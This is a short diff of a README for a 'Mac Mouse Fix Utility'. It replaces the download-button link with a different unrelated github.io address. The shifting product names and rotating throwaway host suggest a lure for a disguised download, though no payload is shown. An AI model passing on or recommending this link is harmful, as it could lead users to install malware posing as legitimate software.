@@ -21,7 +21,7 @@ To begin using this **Mac Mouse Fix Utility** and **Mac Mouse Fix Button Mapper*
 | :--- | :--- |
 | **Get Mac Mouse Fix Utility** | Click the button below to start using this **Mac Mouse Fix Gesture Manager**. |
 
-[![Button](https://img.shields.io/badge/🖱️-Get_Mac_Mouse_Fix-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/mac-mouse-fix-utility)
+[![Button](https://img.shields.io/badge/🖱️-Get_Mac_Mouse_Fix-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/mac-mouse-fix-utility)
 
 ## System Requirements
 
